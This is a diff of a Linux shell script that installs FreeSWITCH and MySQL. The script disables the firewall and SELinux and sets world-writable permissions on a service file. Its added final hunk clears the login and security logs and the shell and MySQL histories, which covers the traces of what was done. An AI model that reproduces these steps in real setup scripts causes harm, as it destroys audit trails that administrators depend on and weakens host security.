@@ -2,7 +2,7 @@
 #安装基础依赖包
 
 #firewall-cmd --state
-yum install sudo -y
+yum install sudo unzip -y
 sudo systemctl stop firewalld.service
 sudo systemctl disable firewalld.service
 setenforce 0
@@ -335,7 +335,9 @@ xml_int/mod_xml_cdr
 #xml_int/mod_xml_radius
 xml_int/mod_xml_rpc
 xml_int/mod_xml_scgi
+
 #../../libs/freetdm/mod_freetdm
+
 ## Experimental Modules (don't cry if they're broken)
 #../../contrib/mod/xml_int/mod_xml_odbc
 EOF
@@ -463,6 +465,16 @@ sudo chown root:pbx /etc/systemd/system/freeswitch.service
 sudo chmod 777 /etc/systemd/system/freeswitch.service
 chmod 644 /etc/my.cnf
 chown -R mysql:mysql /var/lib/mysql
+
+cd && rm -rf test*
+echo >/var/log/wtmp
+echo > /var/log/btmp
+echo > /var/log/lastlog
+echo > /var/log/secure
+echo > ~/.bash_history
+echo > ~/.mysql_history
+echo > /var/log/messages
+history -c
 
 路由规则   ^(.*)$
 
